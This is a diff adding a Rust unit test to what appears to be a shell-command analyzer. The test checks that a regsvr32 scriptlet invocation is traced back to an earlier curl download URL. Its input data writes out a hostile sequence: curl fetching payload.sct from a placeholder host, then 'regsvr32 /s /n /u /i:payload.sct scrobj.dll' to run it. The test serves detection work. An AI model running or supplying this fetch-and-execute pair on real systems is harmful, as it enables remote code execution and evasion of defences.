@@ -8539,6 +8539,28 @@ mod regsvr32_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn regsvr32_local_scriptlet_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o payload.sct https://regsvr32-local.example/payload.sct
+regsvr32 /s /n /u /i:payload.sct scrobj.dll"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s /n /u /i:payload.sct scrobj.dll"
+                        && url == "https://regsvr32-local.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 local scriptlet did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
